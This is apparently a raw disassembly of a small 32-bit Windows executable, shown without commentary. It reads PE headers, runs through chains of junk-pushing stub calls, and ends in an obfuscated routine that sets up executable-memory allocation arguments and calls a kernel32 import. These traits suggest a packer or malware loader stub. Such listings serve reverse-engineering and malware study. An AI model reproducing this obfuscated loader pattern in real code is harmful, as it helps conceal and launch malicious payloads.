0x00401030:	movl	%edi, %edi	; from: 0x0040106c(MAY)
0x00401032:	pusha	
0x00401033:	pushl	%ebp
0x00401034:	movl	%esp, %ebp
0x00401036:	subl	$0x38, %esp
0x00401039:	pushl	%ebx
0x0040103a:	pushl	(%ebx)
0x0040103c:	pushl	(%ebx)
0x0040103e:	pushl	%edi
0x0040103f:	pushl	%edx
0x00401040:	call	0x00401170	; targets: 0x00401170(MAY)
0x0040106c:	jb	0x00401030	; targets: 0x00401072(MAY), 0x00401030(MAY)	; from: 0x004010e5(MAY)
0x00401072:	addb	%al, (%eax)	; from: 0x0040106c(MAY)
0x00401074:	addb	%al, (%eax)
0x00401076:	addb	%al, (%eax)
0x00401078:	addb	%al, (%eax)
0x0040107a:	addb	%al, (%eax)
0x0040107c:	addb	%al, (%eax)
0x0040107e:	addb	%al, (%eax)
0x00401080:	addb	%al, (%eax)
0x00401082:	addb	%al, (%eax)
0x00401084:	addb	%al, (%eax)
0x00401086:	addb	%al, (%eax)
0x00401088:	addb	%al, (%eax)
0x0040108a:	addb	%al, (%eax)
0x0040108c:	movl	%edi, %edi	; from: 0x00401241(MAY)
0x0040108e:	pushl	%ebp
0x0040108f:	movl	%esp, %ebp
0x00401091:	subl	$0x5c, %esp
0x00401094:	pushl	%ebx
0x00401095:	pushl	(%ebx)
0x00401097:	pushl	(%ebx)
0x00401099:	pushl	(%ebx)
0x0040109b:	call	0x0040129c	; targets: 0x0040129c(MAY)

start:
0x004010b0:	andb	$0x0, %al
0x004010b2:	movzbl	%al, %eax
0x004010b5:	pushl	%eax
0x004010b6:	pushl	$0x4020a6
0x004010bb:	popl	%edi
0x004010bc:	adcl	$0x403002, (%esp)
0x004010c3:	movb	0x1(%edi), %ah
0x004010c6:	movb	(%edi), %al
0x004010c8:	roll	$0x10, %eax
0x004010cb:	pushl	0x3a(%eax)
0x004010ce:	popl	%edx
0x004010cf:	shrl	$0x10, %edx
0x004010d2:	addl	$0x1d, %edx
0x004010d5:	addl	%eax, %edx
0x004010d7:	cmpb	$0x3a, (%edx)
0x004010da:	jb	0x004010ea	; targets: 0x004010dc(MAY), 0x004010ea(MAY)
0x004010dc:	xorl	%eax, %eax	; from: 0x004010da(MAY)
0x004010de:	cmpb	$0x55, (%eax,%edx)
0x004010e2:	ja	0x004010ea	; targets: 0x004010ea(MAY), 0x004010e4(MAY)
0x004010e4:	popl	%ebx	; from: 0x004010e2(MAY)
0x004010e5:	jmp	0x0040106c	; targets: 0x0040106c(MAY)
0x004010ea:	popl	%ecx	; from: 0x004010e2(MAY), 0x004010da(MAY)
0x004010eb:	addb	%al, (%eax)
0x004010ed:	addb	%al, 0x43(%edi)
0x004010f0:	addb	%al, (%eax)
0x004010f2:	addb	%al, (%eax)
0x004010f4:	addb	%al, (%eax)
0x004010f6:	addb	%al, (%eax)
0x004010f8:	addb	%al, (%eax)
0x004010fa:	addb	%al, (%eax)
0x004010fc:	addb	%al, (%eax)
0x004010fe:	addb	%al, (%eax)
0x00401100:	addb	%al, (%eax)
0x00401102:	addb	%al, (%eax)
0x00401104:	addb	%al, (%eax)
0x00401106:	addb	%al, (%eax)
0x00401108:	addb	%al, (%eax)
0x0040110a:	addb	%al, (%eax)
0x0040110c:	addb	%al, (%eax)
0x0040110e:	addb	%al, (%eax)
0x00401110:	addb	%al, (%eax)
0x00401112:	addb	%al, (%eax)
0x00401114:	addb	%al, (%eax)
0x00401116:	addb	%al, (%eax)
0x00401118:	addb	%al, (%eax)
0x0040111a:	addb	%al, (%eax)
0x0040111c:	addb	%al, (%eax)
0x0040111e:	addb	%al, (%eax)
0x00401120:	addb	%al, (%eax)
0x00401122:	addb	%al, (%eax)
0x00401124:	addb	%al, (%eax)
0x00401126:	addb	%al, (%eax)
0x00401128:	addb	%al, (%eax)
0x0040112a:	addb	%al, (%eax)
0x0040112c:	addb	%al, (%eax)
0x0040112e:	addb	%al, (%eax)
0x00401130:	addb	%al, (%eax)
0x00401132:	addb	%al, (%eax)
0x00401134:	addb	%al, (%eax)
0x00401136:	addb	%al, (%eax)
0x00401138:	addb	%al, (%eax)
0x0040113a:	addb	%al, (%eax)
0x0040113c:	addb	%al, (%eax)
0x0040113e:	addb	%al, (%eax)
0x00401140:	addb	%al, (%eax)
0x00401142:	addb	%al, (%eax)
0x00401144:	movl	%edi, %edi	; from: 0x00401203(MAY)
0x00401146:	pushl	%ebp
0x00401147:	movl	%esp, %ebp
0x00401149:	subl	$0x2c, %esp
0x0040114c:	pushl	%ebx
0x0040114d:	pushl	%edi
0x0040114e:	pushl	(%ebx)
0x00401150:	pushl	%eax
0x00401151:	call	0x004011c4	; targets: 0x004011c4(MAY)
0x00401170:	movl	%edi, %edi	; from: 0x00401040(MAY)
0x00401172:	pushl	%ebp
0x00401173:	movl	%esp, %ebp
0x00401175:	subl	$0x34, %esp
0x00401178:	pushl	%ebx
0x00401179:	pushl	(%ebx)
0x0040117b:	pushl	(%ebx)
0x0040117d:	pushl	(%ebx)
0x0040117f:	call	0x00401230	; targets: 0x00401230(MAY)
0x004011c4:	movl	%edi, %edi	; from: 0x00401151(MAY)
0x004011c6:	pushl	%ebp
0x004011c7:	movl	%esp, %ebp
0x004011c9:	subl	$0x44, %esp
0x004011cc:	pushl	%ebx
0x004011cd:	pushl	(%ebx)
0x004011cf:	pushl	(%ebx)
0x004011d1:	pushl	(%ebx)
0x004011d3:	pushl	(%ebx)
0x004011d5:	call	0x004012ec	; targets: 0x004012ec(MAY)
0x004011f4:	movl	%edi, %edi	; from: 0x004012a9(MAY)
0x004011f6:	pushl	%ebp
0x004011f7:	movl	%esp, %ebp
0x004011f9:	subl	$0x50, %esp
0x004011fc:	pushl	%ebx
0x004011fd:	pushl	%esi
0x004011fe:	pushl	%eax
0x004011ff:	pushl	(%ebx)
0x00401201:	pushl	(%ebx)
0x00401203:	call	0x00401144	; targets: 0x00401144(MAY)
0x00401230:	movl	%edi, %edi	; from: 0x0040117f(MAY)
0x00401232:	pushl	%ebp
0x00401233:	movl	%esp, %ebp
0x00401235:	subl	$0x44, %esp
0x00401238:	pushl	%ebx
0x00401239:	pushl	(%ebx)
0x0040123b:	pushl	(%ebx)
0x0040123d:	pushl	(%ebx)
0x0040123f:	pushl	(%ebx)
0x00401241:	call	0x0040108c	; targets: 0x0040108c(MAY)
0x0040129c:	movl	%edi, %edi	; from: 0x0040109b(MAY)
0x0040129e:	pushl	%ebp
0x0040129f:	movl	%esp, %ebp
0x004012a1:	subl	$0x5c, %esp
0x004012a4:	pushl	%ebx
0x004012a5:	pushl	(%ebx)
0x004012a7:	pushl	(%ebx)
0x004012a9:	call	0x004011f4	; targets: 0x004011f4(MAY)
0x004012ec:	movl	%edi, %edi	; from: 0x004011d5(MAY)
0x004012ee:	movl	%esp, %ebp
0x004012f0:	subl	$0x30, %esp
0x004012f3:	movl	$0x40, %eax
0x004012f8:	pushl	%eax
0x004012f9:	pushl	$0x1000
0x004012fe:	pushl	$0x6c0
0x00401303:	pushl	$0x0
0x00401305:	leal	0x56ba43b5, %edx
0x0040130b:	subl	$0x567a2391, %edx
0x00401311:	pushl	(%edx)
0x00401313:	pushl	$0x402010
0x00401318:	popl	%edx
0x00401319:	popl	(%edx)
0x0040131b:	decl	(%edx)
0x0040131d:	movl	WaitForSingleObject@kernel32.dll, %eax
0x00401322:	call	%eax	; targets: 0xff00005f(MAY)
